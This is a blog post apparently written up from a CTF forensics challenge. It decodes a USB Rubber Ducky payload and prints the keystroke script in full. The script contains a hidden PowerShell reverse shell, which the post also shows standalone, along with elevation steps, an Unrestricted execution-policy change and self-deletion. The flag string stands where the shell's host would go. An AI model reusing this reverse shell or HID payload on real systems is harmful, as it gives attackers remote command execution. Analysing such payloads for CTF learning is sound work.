@@ -1,0 +1,65 @@
+<!doctype html><html lang=en><head><title>Writeup Cyber Threat Force : Like a duck in water :: Nicolas Bourras</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Note: I did not solve this challenge during the CTF, but my teammate Lukho did.
+For this challenge, we were given an inject.bin file, which contains an encoded Rubber Ducky payload. We can use the Duck Toolkit to get back the original code:
+DELAY DELAY powershell Start-Process notepad -Verb runAsENTER DELAY DELAY ENTER DELAY mDELAY DOWNARROW ... DOWNARROW ENTER $folderDateTime = (get-date).ToString(&amp;#39;d-M-y HHmmss&amp;#39;)ENTER ... Add-Content &amp;#34;$env:TEMP\72794.ps1&amp;#34; &amp;#39;$c = New-Object System.Net.Sockets.TCPClient(&amp;#34;CYBERTF{D0N4LD_DUC|&amp;lt;}&amp;#34;,443);$s = $c."><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-like-a-duck-in-water/><link rel=stylesheet href=https://nicolasb.fr/assets/style.css><link rel=stylesheet href=https://nicolasb.fr/assets/pink.css><link rel=apple-touch-icon href=https://nicolasb.fr/img/apple-touch-icon-192x192.png><link rel="shortcut icon" href=https://nicolasb.fr/img/favicon/pink.png><meta name=twitter:card content="summary"><meta name=twitter:creator content><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Writeup Cyber Threat Force : Like a duck in water"><meta property="og:description" content="Note: I did not solve this challenge during the CTF, but my teammate Lukho did.
+For this challenge, we were given an inject.bin file, which contains an encoded Rubber Ducky payload. We can use the Duck Toolkit to get back the original code:
+DELAY DELAY powershell Start-Process notepad -Verb runAsENTER DELAY DELAY ENTER DELAY mDELAY DOWNARROW ... DOWNARROW ENTER $folderDateTime = (get-date).ToString(&amp;#39;d-M-y HHmmss&amp;#39;)ENTER ... Add-Content &amp;#34;$env:TEMP\72794.ps1&amp;#34; &amp;#39;$c = New-Object System.Net.Sockets.TCPClient(&amp;#34;CYBERTF{D0N4LD_DUC|&amp;lt;}&amp;#34;,443);$s = $c."><meta property="og:url" content="https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-like-a-duck-in-water/"><meta property="og:site_name" content="Nicolas Bourras"><meta property="og:image" content="https://nicolasb.fr/img/favicon/pink.png"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2021-07-11 09:24:09 +0100 +0100"></head><body class=pink><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>Nicolas Bourras</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/about>About</a></li><li><a href=/>Posts</a></li><li><a href=/recipes>Recipes</a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/about>About</a></li><li><a href=/>Posts</a></li><li><a href=/recipes>Recipes</a></li></ul></nav></header><div class=content><div class=post><h1 class=post-title><a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-like-a-duck-in-water/>Writeup Cyber Threat Force : Like a duck in water</a></h1><div class=post-meta><span class=post-date>2021-07-11</span></div><span class=post-tags>#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
+#<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
+#<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
+#<a href=https://nicolasb.fr/tags/cyber-threat-force/>cyber-threat-force</a>&nbsp;
+#<a href=https://nicolasb.fr/tags/forensic/>forensic</a>&nbsp;</span><div class=post-content><div><p>Note: I did not solve this challenge during the CTF, but my teammate <a href=https://twitter.com/lukhooo>Lukho</a> did.</p><p>For this challenge, we were given an <code>inject.bin</code> file, which contains an encoded <a href=https://hak5.org/products/usb-rubber-ducky-deluxe>Rubber Ducky</a> payload. We can use the <a href=https://ducktoolkit.com/encode>Duck Toolkit</a> to get back the original code:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>DELAY
+DELAY
+powershell Start-Process notepad -Verb runAsENTER
+DELAY
+DELAY
+ENTER
+DELAY
+mDELAY
+DOWNARROW
+...
+DOWNARROW
+ENTER
+$folderDateTime = (get-date).ToString(&#39;d-M-y HHmmss&#39;)ENTER
+...
+Add-Content &#34;$env:TEMP\72794.ps1&#34; &#39;$c = New-Object System.Net.Sockets.TCPClient(&#34;CYBERTF{D0N4LD_DUC|&lt;}&#34;,443);$s = $c.GetStream();[byte[]]$b = 0..255|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2&gt;&amp;1 | Out-String );$sb2  = $sb + &#34;PS &#34; + (pwd).Path + &#34;&gt; &#34;;$sby = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()&#39;ENTER
+start-Process powershell.exe -windowstyle hidden &#34;$env:TEMP\72794.ps1&#34;ENTER
+$Report &gt;&gt; $fileSaveDir&#39;/ComputerInfo.html&#39;ENTER
+function copy-ToZip($fileSaveDir){ENTER
+$srcdir = $fileSaveDirENTER
+$zipFile = &#39;C:\Windows\Temp\report.txt\Report.zip&#39;ENTER
+if(-not (test-path($zipFile))) {ENTER
+set-content $zipFile (&#34;PK&#34; + [char]5 + [char]6 + (&#34;$([char]0)&#34; * 18))ENTER
+(dir $zipFile).IsReadOnly = $false}ENTER
+$shellApplication = new-object -com shell.applicationENTER
+$zipPackage = $shellApplication.NameSpace($zipFile)ENTER
+$files = Get-ChildItem -Path $srcdirENTER
+foreach($file in $files) {ENTER
+$zipPackage.CopyHere($file.FullName)ENTER
+while($zipPackage.Items().Item($file.name) -eq $null){ENTER
+Start-sleep -seconds 1 }}}ENTER
+copy-ToZip($fileSaveDir)ENTER
+remove-item $fileSaveDir -recurseENTER
+Remove-Item $MyINvocation.InvocationNameENTER
+DELAY
+C:\Windows\config-72794.ps1ENTER
+DELAY
+DELAY
+DELAY
+powershell Start-Process cmd -Verb runAsENTER
+DELAY
+DELAY
+mode con:cols=14 lines=1ENTER
+DELAY
+mDELAY
+DOWNARROW
+...
+DOWNARROW
+ENTER
+powershell Set-ExecutionPolicy &#39;Unrestricted&#39; -Scope CurrentUser -Confirm:$falseENTER
+DELAY
+powershell.exe -windowstyle hidden -File C:\Windows\config-72794.ps1ENTER
+</code></pre></div><p>We can see that last powershell command, which launches a file that was previously written. The content of that file is:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>$c = New-Object System.Net.Sockets.TCPClient(<span style=color:#e6db74>&#34;CYBERTF{D0N4LD_DUC|&lt;}&#34;</span>,443);$s = $c.GetStream();<span style=color:#66d9ef>[byte[]]</span>$b = 0..255|%{0};<span style=color:#66d9ef>while</span>(($i = $s.Read($b, 0, $b.Length)) <span style=color:#f92672>-ne</span> 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2&gt;&amp;1 | Out-String );$sb2  = $sb + <span style=color:#e6db74>&#34;PS &#34;</span> + (pwd).Path + <span style=color:#e6db74>&#34;&gt; &#34;</span>;$sby = (<span style=color:#66d9ef>[text.encoding]</span>::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()
+</code></pre></div><p>The flag is <code>CYBERTF{D0N4LD_DUC|&lt;}</code>.</p><p>You can <a href=https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/forensic/like-a-duck-in-water>view the sources on github</a> or <a href=/blog/cyber-threat-force-ctf/>read other writeups</a>.</p></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-misc-azkaban-c2/><span class=button__icon>←</span>
+<span class=button__text>Writeup Cyber Threat Force : Azkaban C2</span></a></span>
+<span class="button next"><a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-usb-key-cemetery/><span class=button__text>Writeup Cyber Threat Force : Usb key cemetery</span>
+<span class=button__icon>→</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2021 Powered by <a href=http://gohugo.io>Hugo</a></span>
+<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://nicolasb.fr/assets/main.js></script><script src=https://nicolasb.fr/assets/prism.js></script></div></body></html>
